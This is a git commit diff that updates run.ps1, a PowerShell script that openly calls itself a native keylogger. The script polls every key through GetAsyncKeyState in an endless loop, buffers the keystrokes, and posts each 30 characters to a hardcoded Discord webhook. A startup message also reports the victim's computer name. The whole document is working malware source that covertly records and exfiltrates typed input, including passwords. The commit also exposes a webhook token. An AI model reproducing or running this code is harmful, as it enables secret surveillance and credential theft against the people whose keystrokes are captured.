4636fc51b98016e0f3e0d99bdf67aade1b4b4350
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 00:27:23 +0100

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,7 +1,7 @@
 $webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
 
 # Message de démarrage
-iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing >$null
+iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lance sur $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
 
 $signature = @'
 [DllImport("user32.dll")] public static extern int GetAsyncKeyState(int vKey);
@@ -9,17 +9,17 @@ $signature = @'
 [DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
 '@
 
-Add-Type -MemberDefinition $signature -Namespace "Win32" -Name "NativeMethods"
+Add-Type -MemberDefinition $signature -Namespace "Win32" -Name "NativeMethods" -ErrorAction SilentlyContinue
 
 $buffer = ""
 while ($true) {
     Start-Sleep -Milliseconds 40
-    for ($i=8;$i -le 254;$i++) {
+    for ($i = 8; $i -le 254; $i++) {
         $key = [Win32.NativeMethods]::GetAsyncKeyState($i)
         if ($key -eq -32767) {
             $buffer += [char]$i
             if ($buffer.Length -ge 30) {
-                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing >$null
+                iwr $webhook -Method Post -Body (@{content=$buffer} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
                 $buffer = ""
             }
         }
